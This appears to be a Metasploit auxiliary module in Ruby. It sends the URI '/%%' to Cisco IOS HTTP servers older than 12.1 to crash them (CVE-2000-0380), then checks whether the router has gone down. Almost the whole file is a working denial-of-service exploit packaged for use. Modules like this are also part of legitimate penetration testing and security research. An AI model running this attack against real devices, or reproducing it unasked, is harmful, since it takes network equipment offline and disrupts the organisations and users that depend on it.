##
# $Id$
##

require 'msf/core'

module Msf

class Auxiliary::Dos::Cisco::IOS_HTTP_Percent_DoS < Msf::Auxiliary

	include Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'		=> 'Cisco IOS HTTP %% Denial of Service',
			'Description'	=> %q{
				Send "%%" as the URI to a Cisco IOS HTTP Server
				< 12.1 and it stops responding
			},
			'Author'	=> 'grutz',
			'License'	=> BSD_LICENSE,
			'Version'	=> '$Rev$',
			'References'	=> [
						['BID', '1154'],
						['OSVDB', '1302'],
						['CVE', '2000-0380'],
						['URL', 'http://www.cisco.com/warp/public/707/ioshttpserver-pub.shtml'],
			]
		)

		register_options(
			[
				Opt::RPORT(80),
			], self.class
		)
	end

	def run
		print_status("Sending DoS request...")
		res = send_request_raw({'uri' => '/%%'}, 1)

		print_status("Checking to see if device is still active...")

		begin
			res = send_request_raw({'uri' => '/'}, 5)
			print_status("Received\n\n#{res.body}")
		rescue => e
			print_status("Router DoSed")
		end
	end

end
end
